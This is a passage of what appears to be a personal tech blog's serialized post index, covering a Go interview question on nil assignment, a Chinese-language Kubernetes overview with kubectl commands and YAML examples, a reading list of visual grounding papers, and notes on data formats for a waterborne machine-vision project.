个任务，并通过 pool.AddJob(job) 方法将它们添加到协程池的任务通道中。 每个工作者从任务通道中接收到任务后，会执行相应的任务。 当主函数结束后，通过 select{} 语句使主协程保持活跃状态，保证所有工作者有足够的时间来处理任务。 请注意，实际应用中，你可能需要使用合适的同步机制（例如 sync.WaitGroup）来确保所有任务完成后再关闭协程池，以及处理一些错误和异常情况。 3.下面赋值正确的是()A. var x = nilB. var x interface{} = nilC. var x string = nilD. var x error = nil参考答案及解析：BD。知识点：nil 值。nil 只能赋值给指针、chan、func、interface、map 或 slice 类型的变量。强调下 D 选项的 error 类型，它是一种内置接口类型，看下方贴出的源码就知道，所以 D 是对的。 123type error interface &#123; Error() string&#125; GIN问题","categories":[{"name":"Golang","slug":"Golang","permalink":"http://waynamigo.github.io/categories/Golang/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"go","slug":"go","permalink":"http://waynamigo.github.io/tags/go/"}]},{"title":"Kubernetes Tutorial and Implementation(Overview)","slug":"2023-01-01-kubernets_tutorial(Overview)","date":"2022-12-31T16:00:00.000Z","updated":"2023-01-08T11:22:03.017Z","comments":true,"path":"2023/01/01/2023-01-01-kubernets_tutorial(Overview)/","link":"","permalink":"http://waynamigo.github.io/2023/01/01/2023-01-01-kubernets_tutorial(Overview)/","excerpt":"本篇为OverView，内容包括kubectl的基础操作，整理的知识框架基于kubernetes官方文档v1.26， 元旦期间系统整理一下。","text":"本篇为OverView，内容包括kubectl的基础操作，整理的知识框架基于kubernetes官方文档v1.26， 元旦期间系统整理一下。 Kubernetes Components and Architecture I. Control Plane Components*Control Plane是对集群进行调度管理的中心* API server(kube-apiserver): The API server is a component of the Kubernetes control plane that exposes the Kubernetes API. The API server is the front end for the Kubernetes control plane. 作为Control plane的前端，是认证、授权、访问控制、API注册和发现等机制的统一入口，其中API为restful风格，同时交给etcd存储。 etcd: Consistent and highly-available key value store used as Kubernetes’ backing store for all cluster data. 一致且高度可用的键值存储，用作 Kubernetes 的所有集群数据的后台数据库。 scheduler(kube-scheduler): Control plane component that watches for newly created Pods with no assigned node, and selects a node for them to run on. 负责节点(Node)的调度与监控，职责为监控新创建的、未指定运行Node的 Pods，并选择Node来让 Pod 运行。 调度决策考虑的因素包括单个 Pod 及 Pods 集合的资源需求、软硬件及策略约束、 亲和性及反亲和性规范、数据位置、工作负载间的干扰及最后时限。 controller-manager kube-controller-manager: Control plane component that runs controller processes.Logically, each controller is a separate process, but to reduce complexity, they are all compiled into a single binary and run in a single process. 用于处理集群中常规后台任务，一个资源对应一个控制器，这些控制器包括：12345678节点控制器（Node Controller）： 负责在节点出现故障时进行通知和响应任务控制器（Job Controller）： 监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成端点分片控制器（EndpointSlice controller）： 填充端点分片（EndpointSlice）对象（以提供 Service 和 Pod 之间的链接）。服务账号控制器（ServiceAccount controller）： 为新的命名空间创建默认的服务账号（ServiceAccount）。 cloud-controller-manager:云控制器管理器允许用户将集群连接到云提供商的 API 之上， 并将与该云平台交互的组件同与用户的集群交互的组件分离开来。 与 kube-controller-manager 类似，cloud-controller-manager 将若干逻辑上独立的控制回路组合到同一个可执行文件中，以同一进程的方式运行。 用户可以对其执行水平扩容（运行不止一个副本）以提升性能或者增强容错能力。123456节点控制器（Node Controller）： 用于在节点终止响应后检查云提供商以确定节点是否已被删除路由控制器（Route Controller）： 用于在底层云基础架构中设置路由服务控制器（Service Controller）： 用于创建、更新和删除云提供商负载均衡器 2.Nodekubelet: An agent that runs on each node in the cluster. It makes sure that containers are running in a Pod. 管理本机容器一个集群中每个节点上运行的代理(agent, not proxy)，它保证容器都运行在Pod中负责维护容器的生命周期，同时也负责Volume(CSI，容器存储接口) 和 网络(CNI，容器网络接口)的管理 kube-proxy: kube-proxy is a network proxy that runs on each node in your cluster, implementing part of the Kubernetes Service concept. 提供网络代理，负载均衡等操作 Container Runtime: Docker(Mainly) Docker、containerd、cri-o、rktlet以及任何实现Kubernetes CRI (容器运行环境接口) 的软件。II. Kubernetes WorkLoadsPodsPods are the smallest deployable units of computing that you can create and manage in Kubernetes. 是k8s中最小的单元 一组容器的集合 一个Pod中的所有容器共享同一网络 生命周期是短暂的（服务器重启后，就找不到了） 其中kubectl是Kubernetes集群的命令行接口, 假设一个demopod.yaml: 1234567891011apiVersion: v1 #kubeapi的版本kind: Pod #Pod/Jobmetadata: name: PodName spec: containers: - name: Container Name image: waynamigo/java:runtime ports: - containerPort: 80 restartPolicy: OnFailure 那么由该yaml启动pod的命令格式为 12kubectl [command] [TYPE] [NAME] [flags]kubectl apply -f demopod.yaml 组织形式 1Pod-1Container. 可以将 Pod 看作单个容器的包装器，并且 Kubernetes 直接管理 Pod，而不是容器。 1Pod-NContainer. A Pod can encapsulate an application composed of multiple co-located containers that are tightly coupled and need to share resources.一个Pod可封装(encapsulate)由多个紧密耦合(coupled)且需要共享资源的容器组成的应用程序。Pod 将这些容器和存储资源打包为一个可管理的实体。 资源管理方式 Pod 被设计成支持形成内聚服务单元的多个协作过程，提供两种共享资源：网络，存储(Volume)，使成员容器间能够进行数据共享和通信。 更新与替换 - Update &amp; Replacement 当某Workload的 Pod Template被改变时，Controller会基于更新的模板创建新的 Pod对象，而不是对现有 Pod执行更新或者修补操作。 如果对Pod的某些字段执行 patch 和 replace 等更新操作，则有一些限制： Pod 的绝大多数元数据都是不可变的。例如，用户不可以改变其 namespace、name、 uid 或者 creationTimestamp 字段；generation 字段是比较特别的， 如果更新该字段，只能增加字段取值而不能减少。 如果 metadata.deletionTimestamp 已经被设置，则不可以向 metadata.finalizers 列表中添加新的条目。 Pod 更新不可以改变除 spec.containers.image、spec.initContainers.image、 spec.activeDeadlineSeconds 或 spec.tolerations 之外的字段。 对于 spec.tolerations，用户只被允许添加新的条目。 在更新 spec.activeDeadlineSeconds 字段时，以下两种更新操作是被允许的：如果该字段尚未设置，可以将其设置为一个正数；如果该字段已经设置为一个正数，可以将其设置为一个更小的、非负的整数。 其他 *生命周期*： Pending: 起始状态， Running: 至少有一个主要容器正常启动，进入Running Succeeded/Failed: 取决于 Pod 中是否有容器以失败状态结束 Unknown: 因为某些原因, 无法取得 Pod 状态。这种情况通常是因为与 Pod 所在主机通信失败。 *Probe*：容器探针是由 kubelet 对容器执行的定期诊断。要执行诊断，kubelet 可以执行三种动作： ExecAction（借助容器运行时执行） TCPSocketAction（由 kubelet 直接检测） HTTPGetAction（由 kubelet 直接检测） 特权模式：在 Linux 中，Pod 中的任何容器都可以使用容器规约中的 安全性上下文中的 privileged 参数启用特权模式。 Static Pod：不通过API-server进行管理，直接由特定节点上的 kubelet 守护进程管理，通过 kubelet 直接监控每个 Pod，并在其失效时重启。并且不能引用其他的API对象。 VolumeKubernetes 支持很多类型的卷： Volume声明在Pod容器中可访问的文件目录 一个Pod 可以同时使用任意数目的卷类型。 可以被挂载到Pod中一个或多个容器指定路径下- Pod 配置中的每个容器必须独立指定各个卷的挂载位置 支持多种后端存储抽象【本地存储、分布式存储、云存储】 临时卷类型的生命周期与 Pod 相同 对于给定 Pod 中任何类型的卷，在容器重启期间数据都不会丢失。 持久卷 Persistent Volume：是集群中的一块存储，可以由管理员事先制备， 或者使用存储类（Storage Class）来动态制备。 投射卷 Projected Volume：一个投射卷可以将若干现有的卷源映射到同一个目录之上 临时卷 Ephemeral Volume：有些应用程序需要额外的存储，但并不关心数据在重启后是否仍然可用。 缓存服务经常受限于内存大小，而且可以将不常用的数据转移到比内存慢的存储中，对总体性能的影响并不大。 另有些应用程序需要以文件形式注入的只读数据，比如配置数据或密钥。 Controller 将当前状态（Current State）更新为期望状态（Desired State） 确保预期的pod副本数量【ReplicaSet】 无状态应用部署【Deployment】，无状态就是指，不需要依赖于网络或者ip 有状态应用部署【StatefulSet】，有状态即需要满足特定的初始条件进行部署 确保所有的node运行同一个pod 【DaemonSet】 一次性任务和定时任务【Job和CronJob】 DeploymentDeployment 为 Pod 和其副本(ReplicaSet)提供声明式的更新。 用户负责描述 Deployment 中的 目标状态，（Controller） 以可控的速度更改实际运行状态（Current State)， 使其变为期望状态(Desired State)。 创建Deployment 如下demodeployment.yaml，用户可以定义 Deployment 以创建新的 ReplicaSet，或删除现有 Deployment， 并通过新的 Deployment 分配其资源。123456789101112131415161718192021apiVersion: apps/v1kind: Deploymentmetadata: name: depName labels: app: nginxspec: replicas: 3 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.14.2 ports: - containerPort: 80 该 Deployment 创建一个 ReplicaSet，包含3个Pod 副本。同样通过kubectl运行： 12345678910111213$ kubectl apply -f demodeployment.yaml# 创建后通过get deployments进行获取运行时信息如下$ kubectl get deploymentsNAME READY UP-TO-DATE AVAILABLE AGEdepName 0/3 0 0 1s# 查看 Deployment 上线状态$ kubectl rollout status deployment/depName# 查看 Deployment 创建的 ReplicaSet（rs）$ kubectl get rsNAME DESIRED CURRENT READY AGEdepName-75675f5897 3 3 3 18s# 查看每个 Pod 自动生成的标签$ kubectl get pods --show-labels NAME 列出了名字空间中 Deployment 的名称。 READY 显示应用程序的可用的“副本”数。显示的模式是“就绪个数/期望个数”。 UP-TO-DATE 显示为了达到期望状态已经更新的副本数。 AVAILABLE 显示应用可供用户使用的副本数。 AGE 显示应用程序运行的时间。 更新/回滚/缩放/暂停 Deployments 先来更新上述Pod的container，以使用 nginx:1.16.1 镜像，而不是 nginx:1.14.2 镜像。命令格式如 set image deployment/metadata.name.depName spec.template.spec.containers[0]image12345678910111213```bash# 创建$ kubectl set image deployment/depName nginx=nginx:1.16.1output: deployment.apps/depName edited# 查看deployment的details$ kubectl describe deployments# 查看上线状态$ kubectl rollout status deployment/depNameoutput: 1. Waiting for rollout to finish: 2 out of 3 new replicas have been updated...2. deployment &quot;depName&quot; successfully rolled out# 查看更新后的pod states$ kubectl get pods 回滚操作和git的回滚操作类似 12345678910111213141516171819# 检查deployment修改历史$ kubectl rollout history deployment/depNameoutput:deployments \"depname\"REVISION CHANGE-CAUSE1 kubectl apply --filename=demodeployment.yaml2 kubectl set image deployment/depName nginx=nginx:1.16.13 kubectl set image deployment/depName nginx=nginx:1.161# 可以通过以下方式设置 CHANGE-CAUSE 消息：$ kubectl annotate deployment/depname kubernetes.io/change-cause=\"image updated to 1.16.1\"# 查看某个revision的详细信息 可以通过--revisionc参数指定版本：$ kubectl rollout history deployment/depName --revision=2# 回滚到上一个版本$ kubectl rollout undo deployment/depName# 回滚到指定版本 --to-revision=2$ kubectl rollout undo deployment/depName --to-revision=2output:deployment.apps/depName rolled back$ kubectl describe deployment depName 缩放deployment，即更新replicas，让rs的副本增加或减少 123456# 定量缩放，比如replicas由3变5个$ kubectl scale deployment/depName --replicas=5# 开启Pod的水平自动缩放后，根据cpu利用率设置pod运行个数的上下限$ kubectl autoscale deployment/depName --min=10 --max=15 --cpu-percent=80# 限定可共享的资源$ kubectl set resources deployment/depName -c=nginx --limits=cpu=200m,memory=512Mi 同时具有比例缩放特性 Proportional scaling //TODO::命令设置 暂停deployment 1$ kubectl rollout pause deployment/depName Service Service定义了一组pod的访问规则(An abstract way to expose an application running on a set of Pods as a network service.) Pod的负载均衡，提供一个或多个Pod的稳定访问地址 支持多种方式【ClusterIP、NodePort、LoadBalancer】 In Kubernetes, a Service is an abstraction which defines a logical set of Pods and a policy by which to access them (sometimes this pattern is called a micro-service). The set of Pods targeted by a Service is usually determined by a selector.服务发现 Service in Kubernetes is a REST object, similar to a Pod. Like all of the REST objects, you can POST a Service definition to the API server to create a new instance. 用户想要在应用程序中使用 Kubernetes API 进行服务发现，则可以查询 API 服务器用于匹配 EndpointSlices：只要服务中的 Pod 集合发生更改，Kubernetes 就会为服务更新EndpointSlices。 定义一个demoservice.yaml 1234567891011apiVersion: v1kind: Servicemetadata: name: demoservicespec: selector: app.kubernetes.io/name: MyApp # 使用该sector辨别pods组 ports: - protocol: TCP port: 80 targetPort: 9376 Ingress 首先，Ingress是公开从集群外部到集群内服务的 HTTP 和 HTTPS 路由。 流量路由由 Ingress 资源上定义的规则控制。 Ingress 是对集群中服务的外部访问进行管理的 API 对象，典型的访问方式是 HTTP。 Ingress 可以提供负载均衡、SSL 终结和基于名称的虚拟托管。 An Ingress controller is responsible for fulfilling the Ingress, usually with a load balancer. 123456789101112131415161718apiVersion: networking.k8s.io/v1kind: Ingressmetadata: name: minimal-ingress annotations: nginx.ingress.kubernetes.io/rewrite-target: /spec: ingressClassName: nginx-example rules: - http: paths: - path: /testpath pathType: Prefix backend: service: name: test port: number: 80","categories":[{"name":"Kubernetes","slug":"Kubernetes","permalink":"http://waynamigo.github.io/categories/Kubernetes/"}],"tags":[{"name":"CloudComputing","slug":"CloudComputing","permalink":"http://waynamigo.github.io/tags/CloudComputing/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"http://waynamigo.github.io/tags/Kubernetes/"}]},{"title":"Paper Routing for Visual Grounding","slug":"2022-10-01-VGApproachs","date":"2022-09-30T16:00:00.000Z","updated":"2023-01-04T05:32:52.312Z","comments":true,"path":"2022/10/01/2022-10-01-VGApproachs/","link":"","permalink":"http://waynamigo.github.io/2022/10/01/2022-10-01-VGApproachs/","excerpt":"Visual GroundingReferring ExpressionsPhrase Grounding","text":"Visual GroundingReferring ExpressionsPhrase Grounding Reprensentation Approach几个在VG任务中的主流视觉backbone rpn maskrcnn retinanet(fpn) Vit DETR 文本表示的编码方式/编码器模型 word2vec [File] bert VG paper routing Karpathy, Andrej, Armand Joulin, and Li F. Fei-Fei. Deep fragment embeddings for bidirectional image sentence mapping. Advances in neural information processing systems. 2014. [Paper] RNN类方法 Karpathy, Andrej, and Li Fei-Fei. Deep visual-semantic alignments for generating image descriptions. Proceedings of the IEEE conference on computer vision and pattern recognition. 2015. Method name: Neural Talk. [Paper] [Code] [Torch Code] [Website] 123RPN作为视觉backbone+BiRNN编码文本，前19个region和karpathy分割的snippets（phrase）映射到同一长度vector后进行相似度计算S，max(0,S)以衡量整个图片与句子的相似程度。* 整体是用的retrieval的baseline，类似于SCAN等retrival任务的特征处理方式 Hu, Ronghang, et al. Natural language object retrieval. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016. Method name: Spatial Context RecurrentConvNet (SCRC)* [Paper] [Code] [Website] 123文本提首先进入一个embedding层CNN同样提取global contextual feature和 local feature，LSTM 获取local 和 global信息（两个单元），local处理[x box ,x spatial] Mao, Junhua, et al. Generation and comprehension of unambiguous object descriptions. Proceedings of the IEEE conference on computer vision and pattern recognition. 2016. [Paper] [Code] Wang, Liwei, Yin Li, and Svetlana Lazebnik. Learning deep structure-preserving image-text embeddings. Proceedings of the IEEE conference on computer vision and pattern recognition. 2016. [Paper] [Code] Yu, Licheng, et al. Modeling context in referring expressions. European Conference on Computer Vision. Springer, Cham, 2016. [Paper][Code] Nagaraja, Varun K., Vlad I. Morariu, and Larry S. Davis. Modeling context between objects for referring expression understanding. European Conference on Computer Vision. Springer, Cham, 2016.[Paper] [Code] Rohrbach, Anna, et al. Grounding of textual phrases in images by reconstruction. European Conference on Computer Vision. Springer, Cham, 2016. Method Name: GroundR [Paper] [Tensorflow Code] [Torch Code] Wang, Mingzhe, et al. Structured matching for phrase localization. European Conference on Computer Vision. Springer, Cham, 2016. Method name: Structured Matching [Paper] [Code] Hu, Ronghang, Marcus Rohrbach, and Trevor Darrell. Segmentation from natural language expressions. European Conference on Computer Vision. Springer, Cham, 2016. [Paper] [Code] [Website] Fukui, Akira et al. Multimodal Compact Bilinear Pooling for Visual Question Answering and Visual Grounding. EMNLP (2016). Method name: MCB [Paper][Code] Endo, Ko, et al. An attention-based regression model for grounding textual phrases in images. Proc. IJCAI. 2017. [Paper] Chen, Kan, et al. MSRC: Multimodal spatial regression with semantic context for phrase grounding. International Journal of Multimedia Information Retrieval 7.1 (2018): 17-28. [Paper -Springer Link] Wu, Fan et al. An End-to-End Approach to Natural Language Object Retrieval via Context-Aware Deep Reinforcement Learning. CoRR abs/1703.07579 (2017): n. pag. [Paper] [Code] Yu, Licheng, et al. A joint speakerlistener-reinforcer model for referring expressions. Computer Vision and Pattern Recognition (CVPR). Vol. 2. 2017. [Paper] [Code][Website] Hu, Ronghang, et al. Modeling relationships in referential expressions with compositional modular networks. Computer Vision and Pattern Recognition (CVPR), 2017 IEEE Conference on. IEEE, 2017. [Paper] [Code] Luo, Ruotian, and Gregory Shakhnarovich. Comprehension-guided referring expressions. Computer Vision and Pattern Recognition (CVPR). Vol. 2. 2017. [Paper] [Code] Liu, Jingyu, Liang Wang, and Ming-Hsuan Yang. Referring expression generation and comprehension via attributes. Proceedings of CVPR. 2017. [Paper] Xiao, Fanyi, Leonid Sigal, and Yong Jae Lee. Weakly-supervised visual grounding of phrases with linguistic structures. arXiv preprint arXiv:1705.01371 (2017). [Paper] Plummer, Bryan A., et al. Phrase localization and visual relationship detection with comprehensive image-language cues. Proc. ICCV. 2017. [Paper] [Code] Chen, Kan, Rama Kovvuri, and Ram Nevatia. Query-guided regression network with context policy for phrase grounding. Proceedings of the IEEE International Conference on Computer Vision (ICCV). 2017. Method name: QRC [Paper] [Code] Liu, Chenxi, et al. Recurrent Multimodal Interaction for Referring Image Segmentation. ICCV. 2017. [Paper] [Code] Li, Jianan, et al. Deep attribute-preserving metric learning for natural language object retrieval. Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017. [Paper: ACM Link] Li, Xiangyang, and Shuqiang Jiang. Bundled Object Context for Referring Expressions. IEEE Transactions on Multimedia (2018). [Paper ieee link] Yu, Zhou, et al. Rethinking Diversified and Discriminative Proposal Generation for Visual Grounding. arXiv preprint arXiv:1805.03508 (2018). [Paper] [Code] Yu, Licheng, et al. Mattnet: Modular attention network for referring expression comprehension. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2018. [Paper] [Code] [Website] Deng, Chaorui, et al. Visual Grounding via Accumulated Attention. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2018.[Paper] Li, Ruiyu, et al. Referring image segmentation via recurrent refinement networks. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2018.[Paper] [Code] Zhang, Yundong, Juan Carlos Niebles, and Alvaro Soto. Interpretable Visual Question Answering by Visual Grounding from Attention Supervision Mining. arXiv preprint arXiv:1808.00265 (2018). [Paper] Chen, Kan, Jiyang Gao, and Ram Nevatia. Knowledge aided consistency for weakly supervised phrase grounding. arXiv preprint arXiv:1803.03879 (2018). [Paper] [Code] Zhang, Hanwang, Yulei Niu, and Shih-Fu Chang. Grounding referring expressions in images by variational context. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2018. [Paper] [Code] Cirik, Volkan, Taylor Berg-Kirkpatrick, and Louis-Philippe Morency. Using syntax to ground referring expressions in natural images. arXiv preprint arXiv:1805.10547 (2018).[Paper] [Code] Margffoy-Tuay, Edgar, et al. Dynamic multimodal instance segmentation guided by natural language queries. Proceedings of the European Conference on Computer Vision (ECCV). 2018. [Paper] [Code] Shi, Hengcan, et al. Key-word-aware network for referring expression image segmentation. Proceedings of the European Conference on Computer Vision (ECCV). 2018.[Paper] [Code] Plummer, Bryan A., et al. Conditional image-text embedding networks. Proceedings of the European Conference on Computer Vision (ECCV). 2018. [Paper] [Code] Akbari, Hassan, et al. Multi-level Multimodal Common Semantic Space for Image-Phrase Grounding. arXiv preprint arXiv:1811.11683 (2018). [Paper] Kovvuri, Rama, and Ram Nevatia. PIRC Net: Using Proposal Indexing, Relationships and Context for Phrase Grounding. arXiv preprint arXiv:1812.03213 (2018). [Paper] Chen, Xinpeng, et al. Real-Time Referring Expression Comprehension by Single-Stage Grounding Network. arXiv preprint arXiv:1812.03426 (2018). [Paper] Wang, Peng, et al. Neighbourhood Watch: Referring Expression Comprehension via Language-guided Graph Attention Networks. arXiv preprint arXiv:1812.04794 (2018). [Paper] Liu, Daqing, et al. Learning to Assemble Neural Module Tree Networks for Visual Grounding. Proceedings of the IEEE International Conference on Computer Vision (ICCV). 2019. [Paper] [Code] RETRACTED (see #2): Deng, Chaorui, et al. You Only Look &amp; Listen Once: Towards Fast and Accurate Visual Grounding. arXiv preprint arXiv:1902.04213 (2019). [Paper] Hong, Richang, et al. Learning to Compose and Reason with Language Tree Structures for Visual Grounding. IEEE Transactions on Pattern Analysis and Machine Intelligence (T-PAMI). 2019. [Paper] Liu, Xihui, et al. Improving Referring Expression Grounding with Cross-modal Attention-guided Erasing. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2019. [Paper] Dogan, Pelin, Leonid Sigal, and Markus Gross. Neural Sequential Phrase Grounding (SeqGROUND). Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. (CVPR) 2019. [Paper] Datta, Samyak, et al. Align2ground: Weakly supervised phrase grounding guided by image-caption alignment. arXiv preprint arXiv:1903.11649 (2019). (ICCV 2019) [Paper] Fang, Zhiyuan, et al. Modularized textual grounding for counterfactual resilience. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. (CVPR) 2019. [Paper] Ye, Linwei, et al. Cross-Modal Self-Attention Network for Referring Image Segmentation. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. (CVPR) 2019. [Paper] Yang, Sibei, Guanbin Li, and Yizhou Yu. Cross-Modal Relationship Inference for Grounding Referring Expressions. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. (CVPR) 2019. [Paper] Yang, Sibei, Guanbin Li, and Yizhou Yu. Dynamic Graph Attention for Referring Expression Comprehension. arXiv preprint arXiv:1909.08164 (2019). (ICCV 2019) [Paper] [Code] Wang, Josiah, and Lucia Specia. Phrase Localization Without Paired Training Examples. arXiv preprint arXiv:1908.07553 (2019). (ICCV 2019) [Paper] [Code] Yang, Zhengyuan, et al. A Fast and Accurate One-Stage Approach to Visual Grounding. arXiv preprint arXiv:1908.06354 (2019). (ICCV 2019) [Paper] [Code] Sadhu, Arka, Kan Chen, and Ram Nevatia. Zero-Shot Grounding of Objects from Natural Language Queries. arXiv preprint arXiv:1908.07129 (2019).(ICCV 2019) [Paper] [Code] Disclaimer: I am an author of the paper Liu, Xuejing, et al. Adaptive Reconstruction Network for Weakly Supervised Referring Expression Grounding. arXiv preprint arXiv:1908.10568 (2019). (ICCV 2019) [Paper] [Code] Chen, Yi-Wen, et al. Referring Expression Object Segmentation with Caption-Aware Consistency. arXiv preprint arXiv:1910.04748 (2019). (BMVC 2019) [Paper] [Code] Liu, Jiacheng, and Julia Hockenmaier. Phrase Grounding by Soft-Label Chain Conditional Random Field. arXiv preprint arXiv:1909.00301 (2019) (EMNLP 2019). [Paper] [Code] Liu, Yongfei, Wan Bo, Zhu Xiaodan and He Xuming. Learning Cross-modal Context Graph for Visual Grounding. arXiv preprint arXiv: (2019) (AAAI-2020). [Paper] [Code] Yu, Tianyu, et al. Cross-Modal Omni Interaction Modeling for Phrase Grounding. Proceedings of the 28th ACM International Conference on Multimedia. ACM 2020. [Paper: ACM Link] [Code] Qiu, Heqian, et al. Language-Aware Fine-Grained Object Representation for Referring Expression Comprehension. Proceedings of the 28th ACM International Conference on Multimedia. ACM 2020. [Paper: ACM Link] Wang, Qinxin, et al. MAF: Multimodal Alignment Framework for Weakly-Supervised Phrase Grounding. arXiv preprint arXiv:2010.05379 (2020). [Paper] [Code] Liao, Yue, et al. A real-time cross-modality correlation filtering method for referring expression comprehension. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2020. [Paper] Hu, Zhiwei, et al. Bi-directional relationship inferring network for referring image segmentation. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2020. [Paper] [Code] Yang, Sibei, Guanbin Li, and Yizhou Yu. Graph-structured referring expression reasoning in the wild. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2020. [Paper] [Code] Luo, Gen, et al. Multi-task collaborative network for joint referring expression comprehension and segmentation. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2020. [Paper] [Code] Gupta, Tanmay, et al. Contrastive learning for weakly supervised phrase grounding. Proceedings of the European Conference on Computer Vision (ECCV). 2020. [Paper] [Code] Yang, Zhengyuan, et al. Improving one-stage visual grounding by recursive sub-query construction. Proceedings of the European Conference on Computer Vision (ECCV). 2020. [Paper] [Code] Wang, Liwei, et al. Improving Weakly Supervised Visual Grounding by Contrastive Knowledge Distillation. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. [Paper] Sun, Mingjie, Jimin Xiao, and Eng Gee Lim. Iterative Shrinking for Referring Expression Grounding Using Deep Reinforcement Learning. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. [Paper] [Code] Liu, Haolin, et al. Refer-it-in-RGBD: A Bottom-up Approach for 3D Visual Grounding in RGBD Images. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. [Paper] [Code] Liu, Yongfei, et al. Relation-aware Instance Refinement for Weakly Supervised Visual Grounding. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. [Paper] [Code] Lin, Xiangru, Guanbin Li, and Yizhou Yu. Scene-Intuitive Agent for Remote Embodied Visual Grounding. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2021. [Paper] Sun, Mingjie, et al. Discriminative triad matching and reconstruction for weakly referring expression grounding. IEEE transactions on pattern analysis and machine intelligence (TPAMI 2021). [Paper] [Code] Mu, Zongshen, et al. Disentangled Motif-aware Graph Learning for Phrase Grounding. arXiv preprint arXiv:2104.06008 (AAAI 2021). [Paper] Chen, Long, et al. Ref-NMS: Breaking Proposal Bottlenecks in Two-Stage Referring Expression Grounding. arXiv preprint arXiv:2009.01449 (AAAI-2021). [Paper] [Code] Deng, Jiajun, et al. TransVG: End-to-End Visual Grounding with Transformers. arXiv preprint arXiv:2104.08541 (2021). [Paper] [Unofficial Code] Du, Ye, et al. Visual Grounding with Transformers. arXiv preprint arXiv:2105.04281 (2021). [Paper] Kamath, Aishwarya, et al. MDETR–Modulated Detection for End-to-End Multi-Modal Understanding. arXiv preprint arXiv:2104.12763 (2021). [Paper] Natural Language Object Retrieval (Images) Guadarrama, Sergio, et al. Open-vocabulary Object Retrieval. Robotics: science and systems. Vol. 2. No. 5. 2014. [Paper] [Code] Hu, Ronghang, et al. Natural language object retrieval. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016. Method name: Spatial Context Recurrent ConvNet (SCRC) [Paper] [Code] [Website] Wu, Fan et al. An End-to-End Approach to Natural Language Object Retrieval via Context-Aware Deep Reinforcement Learning. CoRR abs/1703.07579 (2017): n. pag. [Paper] [Code] Li, Jianan, et al. Deep attribute-preserving metric learning for natural language object retrieval. Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017. [Paper: ACM Link] Nguyen, Anh, et al. Object Captioning and Retrieval with Natural Language. arXiv preprint arXiv:1803.06152 (2018). [Paper] [Website] Plummer, Bryan A., et al. Open-vocabulary Phrase Detection. arXiv preprint arXiv:1811.07212 (2018). [Paper] [Code] Grounding Relations / Referring Relations Krishna, Ranjay, et al. Referring relationships. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2018. [Paper] [Code] [Website] Raboh, Moshiko et al. Differentiable Scene Graphs. (2019). [Paper] Conser, Erik, et al. Revisiting Visual Grounding. arXiv preprint arXiv:1904.02225 (2019).[Paper] Critique of Referring Relationship paper Grounded Description (Image) (WIP) Hendricks, Lisa Anne, et al. Generating visual explanations. European Conference on Computer Vision. Springer, Cham, 2016. [Paper] [Code] [Pytorch Code] Jiang, Ming, et al. TIGEr: Text-to-Image Grounding for Image Caption Evaluation. arXiv preprint arXiv:1909.02050 (2019). (EMNLP 2019) [Paper] [Code] Lee, Jason, Kyunghyun Cho, and Douwe Kiela. Countering language drift via visual grounding. arXiv preprint arXiv:1909.04499 (2019). (EMNLP 2019) [Paper]","categories":[{"name":"VisualGrounding","slug":"VisualGrounding","permalink":"http://waynamigo.github.io/categories/VisualGrounding/"}],"tags":[{"name":"Multimodal","slug":"Multimodal","permalink":"http://waynamigo.github.io/tags/Multimodal/"},{"name":"Paper","slug":"Paper","permalink":"http://waynamigo.github.io/tags/Paper/"},{"name":"VisualGrounding","slug":"VisualGrounding","permalink":"http://waynamigo.github.io/tags/VisualGrounding/"}]},{"title":"业务数据需求及数据处理概要-水上机器视觉场景","slug":"2022-10-01-水上机器视觉-桥洞场景业务功能模块设计","date":"2022-09-30T16:00:00.000Z","updated":"2023-01-04T06:40:06.334Z","comments":true,"path":"2022/10/01/2022-10-01-水上机器视觉-桥洞场景业务功能模块设计/","link":"","permalink":"http://waynamigo.github.io/2022/10/01/2022-10-01-水上机器视觉-桥洞场景业务功能模块设计/","excerpt":"水上机器视觉场景业务分析","text":"水上机器视觉场景业务分析 web摄像头即时视频流初始数据格式：船载web摄像头获取的视频流，基于本地流媒体服务传输到系统（rtmp/rtsp） 处理方式：ffmpeg解码视频流到rgb图像帧，经测试基于nginx的rtmp流媒体在本地延迟在80ms左右（局域网场景，摄像头参数为1080p双摄，nginx流媒体部署于树莓派3b+） 处理后数据格式：ImageFrame - 以 {测试样例_时间戳}.jpg 命名 点云数据「二维平面（综合判定的）点云的点以圆输出，给出圆心坐标、圆半径」 from 水上机器视觉技术讨论_会议纪要.doc 初始数据格式：点云中单个点以圆心坐标、圆半径的形式给出？ 能否理解为：将点云做一次拟合圆之后，给出船体所在水平面的点云 处理方式：能否直接给出拟合圆以前的世界坐标系/雷达坐标系下的点云PointXYZ，和雷达轨迹（四元数或欧拉角描述） 处理后数据格式： 每一图像帧时刻的PCL处理的点云数据，以PointXYZ描述 { pointid, x, y, z} 